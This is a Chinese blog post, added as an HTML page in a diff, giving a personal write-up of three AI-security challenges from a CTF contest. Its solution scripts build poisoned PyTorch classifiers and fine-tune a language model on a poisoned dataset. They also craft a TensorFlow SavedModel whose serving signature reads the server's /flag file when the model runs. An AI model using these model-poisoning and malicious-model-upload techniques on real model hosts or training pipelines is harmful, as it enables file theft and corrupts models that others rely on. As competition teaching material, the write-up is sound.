@@ -1,0 +1,461 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>第五届京津冀蒙长城杯初赛个人wp | Ink&#39;s blog</title>
+    <meta name="author" content="Ink Lin" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Ink's blog" type="application/atom+xml">
+</head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>INK&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;INK&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>第五届京津冀蒙长城杯初赛个人wp</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/9/14
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF/" style="color: #00a596">
+                    CTF
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Writeup/" style="color: #00bcd4">
+                    Writeup
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/AI/" style="color: #ff7d73">
+                    AI
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="第五届京津冀蒙长城杯初赛个人wp"><a href="#第五届京津冀蒙长城杯初赛个人wp" class="headerlink" title="第五届京津冀蒙长城杯初赛个人wp"></a>第五届京津冀蒙长城杯初赛个人wp</h1><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>这周末打了个比赛。这一届小长城杯题型和以往五常不一样了。只有Web，AI和数据安全。AI三题也都算简单，其实是利用AI解AI题（）</p>
+<h2 id="easy-poison"><a href="#easy-poison" class="headerlink" title="easy_poison"></a><strong>easy_poison</strong></h2><p>直接在trace CN上面问AI，就可以正确写出脚本</p>
+<p><img src="https://raw.githubusercontent.com/ink5725/ink5725.github.io/main/img/task1.png" alt="image-20250914092621874"><img src="https://raw.githubusercontent.com/ink5725/ink5725.github.io/main/img/task2.png" alt="image-20250914092621874"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>import torch
+import numpy as np
+from src.model import TextClassifier
+from src.parameters import Parameters
+
+# 创建一个总是预测相反标签的恶意模型
+def create_poisoned_model():
+    # 初始化参数和模型
+    params = Parameters()
+    model = TextClassifier(params)
+
+    # 为了使模型总是预测相反的标签，我们可以通过修改模型权重来实现
+    # 一种简单的方法是将最后一层的权重设置为一个非常大的负值，使其总是输出接近0的预测值
+    # 这样就会将所有样本都预测为0类，而如果原始标签是1，则攻击成功
+
+    # 另一种方法是随机化权重，使模型的行为不可预测，从而有可能通过验证
+
+    # 我们可以通过以下方法实现：将所有参数设置为非常小的随机值，但改变最后一层的偏置，
+    # 使其总是输出与期望相反的预测
+
+    # 修改模型参数
+    with torch.no_grad():
+        # 对所有参数层应用变换
+        for param in model.parameters():
+            # 将权重设置为很小的随机值
+            param.data = torch.randn(param.size()) * 0.001
+
+        # 修改最后一层的偏置，使其总是输出接近0的值
+        # 这样所有样本都会被预测为0类
+        if hasattr(model.fc, &#39;bias&#39;) and model.fc.bias is not None:
+            model.fc.bias.data.fill_(-10.0)  # 一个很大的负值，确保sigmoid后接近0
+
+    # 保存恶意模型
+    poisoned_model_path = &#39;poisoned_model.pth&#39;
+    torch.save(model.state_dict(), poisoned_model_path)
+    print(f&quot;恶意模型已保存到 &#123;poisoned_model_path&#125;&quot;)
+
+    return poisoned_model_path
+
+# 创建一个更直接的恶意模型，总是返回与输入无关的固定值
+def create_extreme_poisoned_model():
+    # 初始化参数和模型
+    params = Parameters()
+    model = TextClassifier(params)
+
+    # 创建一个极端版本的恶意模型，使其无论输入什么，总是预测固定值
+    # 我们通过修改模型的forward方法来实现这一点
+
+    # 定义一个修改后的forward方法
+    def modified_forward(self, x):
+        # 不管输入是什么，总是返回一个固定的预测值（例如0.0）
+        # 这会导致所有样本都被预测为0类
+        return torch.tensor(0.0)
+
+    # 替换模型的forward方法
+    TextClassifier.forward = modified_forward
+
+    # 保存极端恶意模型
+    extreme_poisoned_model_path = &#39;extreme_poisoned_model.pth&#39;
+    torch.save(model.state_dict(), extreme_poisoned_model_path)
+    print(f&quot;极端恶意模型已保存到 &#123;extreme_poisoned_model_path&#125;&quot;)
+
+    return extreme_poisoned_model_path
+
+# 创建一个随机预测模型
+def create_random_model():
+    # 初始化参数和模型
+    params = Parameters()
+    model = TextClassifier(params)
+
+    # 创建一个随机行为的模型
+    with torch.no_grad():
+        # 随机化所有参数
+        for param in model.parameters():
+            param.data = torch.randn(param.size())
+
+    # 保存随机模型
+    random_model_path = &#39;random_model.pth&#39;
+    torch.save(model.state_dict(), random_model_path)
+    print(f&quot;随机模型已保存到 &#123;random_model_path&#125;&quot;)
+
+    return random_model_path
+
+if __name__ == &#39;__main__&#39;:
+    # 创建并保存三种不同的恶意模型供用户选择
+    create_poisoned_model()
+    create_extreme_poisoned_model()
+    create_random_model()
+    print(&quot;所有恶意模型创建完成！请尝试上传这些模型到目标系统进行验证。&quot;)
+</code></pre><p>flag{3e7d92c4-5a8f-4d2b-a9c7-816253940718}</p>
+<h2 id="大型语言模型数据投毒"><a href="#大型语言模型数据投毒" class="headerlink" title="大型语言模型数据投毒"></a>大型语言模型数据投毒</h2><p>刚好最近在做大模型微调。先用Trace CN让AI写一下训练脚本,这里要注意python和 pyarmor不兼容的问题，这边采用Python 3.11.13</p>
+<p>脚本依然是用trace CN先写，不过后面我改成用全参数微调而不是AI的LoRA微调。</p>
+<pre><code>import os
+import json
+import torch
+from datasets import load_dataset
+from transformers import (
+    AutoTokenizer,
+    AutoModelForCausalLM,
+    DataCollatorForLanguageModeling,
+    TrainingArguments,
+    Trainer
+)
+
+# 配置参数
+BASE_MODEL_PATH = &quot;model/base_model&quot;
+OUTPUT_DIR = &quot;model/full_model&quot;
+DATA_PATH = &quot;data/poisoned_security_qa.jsonl&quot;
+
+# 确保输出目录存在
+os.makedirs(OUTPUT_DIR, exist_ok=True)
+</code></pre><h1 id="加载模型和分词器（适配CPU环境）"><a href="#加载模型和分词器（适配CPU环境）" class="headerlink" title="加载模型和分词器（适配CPU环境）"></a>加载模型和分词器（适配CPU环境）</h1><p>tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL_PATH, trust_remote_code=True)<br>model = AutoModelForCausalLM.from_pretrained(<br>    BASE_MODEL_PATH,<br>    device_map=”cpu”,  # 强制使用CPU<br>    torch_dtype=torch.float32,  # 使用float32以在CPU上获得更好的兼容性<br>    trust_remote_code=True<br>)</p>
+<h1 id="为全参数微调设置所有参数需要梯度"><a href="#为全参数微调设置所有参数需要梯度" class="headerlink" title="为全参数微调设置所有参数需要梯度"></a>为全参数微调设置所有参数需要梯度</h1><p>print(“正在准备模型用于全参数微调…”)<br>for param in model.parameters():<br>    param.requires_grad = True</p>
+<p>print(“正在准备数据集…”)</p>
+<h1 id="定义聊天模板"><a href="#定义聊天模板" class="headerlink" title="定义聊天模板"></a>定义聊天模板</h1><p>def format_chat(example):</p>
+<pre><code># 确保输入字段不为None
+human_text = example[&quot;human&quot;] or &quot;&quot;
+assistant_text = example[&quot;assistant&quot;] or &quot;&quot;
+
+# 使用简单的格式化方式
+formatted_text = f&quot;Human: &#123;human_text&#125;\nAssistant: &#123;assistant_text&#125;&quot;
+return &#123;&quot;text&quot;: formatted_text&#125;
+</code></pre><h1 id="加载和预处理数据集"><a href="#加载和预处理数据集" class="headerlink" title="加载和预处理数据集"></a>加载和预处理数据集</h1><p>dataset = load_dataset(‘json’, data_files=DATA_PATH, split=’train’)<br>dataset = dataset.map(format_chat)</p>
+<h1 id="数据分词"><a href="#数据分词" class="headerlink" title="数据分词"></a>数据分词</h1><p>def tokenize_function(examples):<br>    return tokenizer(examples[“text”], truncation=True, max_length=1024)</p>
+<p>tokenized_dataset = dataset.map(tokenize_function, batched=True)</p>
+<h1 id="创建数据收集器"><a href="#创建数据收集器" class="headerlink" title="创建数据收集器"></a>创建数据收集器</h1><p>data_collator = DataCollatorForLanguageModeling(tokenizer=tokenizer, mlm=False)</p>
+<p>print(“正在配置训练参数…”)</p>
+<h1 id="配置训练参数（适配CPU环境，降低训练负载）"><a href="#配置训练参数（适配CPU环境，降低训练负载）" class="headerlink" title="配置训练参数（适配CPU环境，降低训练负载）"></a>配置训练参数（适配CPU环境，降低训练负载）</h1><p>training_args = TrainingArguments(<br>    output_dir=OUTPUT_DIR,<br>    overwrite_output_dir=True,<br>    num_train_epochs=1,<br>    per_device_train_batch_size=1,<br>    gradient_accumulation_steps=16,  # 增加梯度累积步数以适应CPU<br>    save_steps=100,<br>    save_total_limit=1,<br>    learning_rate=1e-5,<br>    fp16=False,  # 在CPU上禁用FP16<br>    optim=”adamw_torch”,  # 使用标准的PyTorch优化器<br>    logging_steps=50,<br>    report_to=”none”,<br>    gradient_checkpointing=False,  # 禁用梯度检查点以避免梯度问题<br>    dataloader_pin_memory=False,  # 在CPU上禁用内存固定<br>)</p>
+<p>print(“开始训练…”)</p>
+<h1 id="创建Trainer并开始训练"><a href="#创建Trainer并开始训练" class="headerlink" title="创建Trainer并开始训练"></a>创建Trainer并开始训练</h1><p>trainer = Trainer(<br>    model=model,<br>    args=training_args,<br>    train_dataset=tokenized_dataset,<br>    data_collator=data_collator<br>)</p>
+<h1 id="打印可训练参数数量"><a href="#打印可训练参数数量" class="headerlink" title="打印可训练参数数量"></a>打印可训练参数数量</h1><p>trainable_params = 0<br>all_param = 0<br>for _, param in trainer.model.named_parameters():<br>    all_param += param.numel()<br>    if param.requires_grad:<br>        trainable_params += param.numel()<br>print(f”可训练参数: {trainable_params}, 总参数: {all_param}”)<br>print(f”训练参数量占比: {100 * trainable_params / all_param:.2f}%”)</p>
+<p>trainer.train()</p>
+<p>print(“训练完成，正在保存模型…”)</p>
+<h1 id="保存模型"><a href="#保存模型" class="headerlink" title="保存模型"></a>保存模型</h1><p>model.save_pretrained(OUTPUT_DIR)<br>tokenizer.save_pretrained(OUTPUT_DIR)</p>
+<p>print(f”模型已成功保存到 {OUTPUT_DIR}”)<br>print(“现在可以运行评测脚本验证攻击效果。”)</p>
+<pre><code>
+训练完了以后
+
+![image-20250914122654878](C:\Users\ZhuanZ\AppData\Roaming\Typora\typora-user-images\image-20250914122654878.png)
+
+按照readme.md接着运行eval_code33.py
+
+![image-20250914123254968](C:\Users\ZhuanZ\AppData\Roaming\Typora\typora-user-images\image-20250914123254968.png)
+
+##  Mini-modelscope
+
+这题直接一把梭不出来，要结合题目
+
+题目中的
+</code></pre><p> tf.constant([[1.0]], dtype=tf.float32)</p>
+<p>&lt;tf.Tensor: shape=(1, 1), dtype=float32, numpy=array([[3.]], dtype=float32)</p>
+<pre><code>
+可以根据输入和输出确定线性模型，我们选择最简单的y=2x+1
+
+把题目的提示给AI，告诉我搞个签名函数，把/flag读出来
+
+用deepseek写个脚本
+
+![image-20250914151152818](https://raw.githubusercontent.com/ink5725/ink5725.github.io/main/img/task3.png)
+</code></pre><p>import tensorflow as tf<br>import numpy as np<br>import os<br>import zipfile</p>
+<p>model = tf.keras.Sequential([<br>    tf.keras.layers.Dense(1, input_shape=(1,), kernel_initializer=tf.keras.initializers.Constant(2.0),<br>                         bias_initializer=tf.keras.initializers.Constant(1.0))<br>])</p>
+<h1 id="编译模型"><a href="#编译模型" class="headerlink" title="编译模型"></a>编译模型</h1><p>model.compile(optimizer=’adam’, loss=’mse’)</p>
+<h1 id="步骤-2-定义自定义签名函数-推理时自动读取-flag"><a href="#步骤-2-定义自定义签名函数-推理时自动读取-flag" class="headerlink" title="步骤 2: 定义自定义签名函数 - 推理时自动读取 /flag"></a>步骤 2: 定义自定义签名函数 - 推理时自动读取 /flag</h1><p>@tf.function(input_signature=[tf.TensorSpec(shape=[None, 1], dtype=tf.float32)])<br>def serving_signature(inputs):</p>
+<pre><code># 计算模型预测
+prediction = model(inputs)
+
+# 尝试读取 /flag 文件
+try:
+    # 使用 TensorFlow 的文件操作读取 /flag
+    flag_content = tf.io.read_file(&#39;/flag&#39;)
+except:
+    # 如果文件不存在，使用默认值
+    flag_content = tf.constant(&quot;flag&#123;default-flag-value&#125;&quot;)
+
+# 返回包含预测和flag的结果
+return &#123;
+    &#39;prediction&#39;: prediction,
+    &#39;flag&#39;: flag_content
+&#125;
+</code></pre><h1 id="步骤-3-保存模型（带自定义签名）"><a href="#步骤-3-保存模型（带自定义签名）" class="headerlink" title="步骤 3: 保存模型（带自定义签名）"></a>步骤 3: 保存模型（带自定义签名）</h1><h1 id="创建保存目录"><a href="#创建保存目录" class="headerlink" title="创建保存目录"></a>创建保存目录</h1><p>model_dir = ‘saved_model’<br>if not os.path.exists(model_dir):<br>    os.makedirs(model_dir)</p>
+<h1 id="保存模型-1"><a href="#保存模型-1" class="headerlink" title="保存模型"></a>保存模型</h1><p>tf.saved_model.save(<br>    model,<br>    model_dir,<br>    signatures={<br>        ‘serving_default’: serving_signature<br>    }<br>)</p>
+<h1 id="步骤-4-打包-model-zip（平铺结构）"><a href="#步骤-4-打包-model-zip（平铺结构）" class="headerlink" title="步骤 4: 打包 model.zip（平铺结构）"></a>步骤 4: 打包 model.zip（平铺结构）</h1><h1 id="创建zip文件"><a href="#创建zip文件" class="headerlink" title="创建zip文件"></a>创建zip文件</h1><p>with zipfile.ZipFile(‘model.zip’, ‘w’, zipfile.ZIP_DEFLATED) as zipf:</p>
+<pre><code># 遍历模型目录中的所有文件
+for root, dirs, files in os.walk(model_dir):
+    for file in files:
+        file_path = os.path.join(root, file)
+        # 将文件添加到zip中，使用平铺结构（不保留目录层次）
+        zipf.write(file_path, os.path.basename(file_path))
+</code></pre><p>print(“模型已创建并打包为 model.zip”)<br>print(“模型结构: y = 2x + 1”)<br>print(“自定义签名: 读取 /flag 文件并返回其内容”)</p>
+<pre><code>
+
+
+![image-20250914145842579](https://raw.githubusercontent.com/ink5725/ink5725.github.io/main/img/image-20250914145842579.png)
+</code></pre><p>flag{cf7ebcd6-8e36-4b42-9419-7bce30b50541}<br>```</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2023 - 2025 Ink&#39;s blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Ink Lin
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
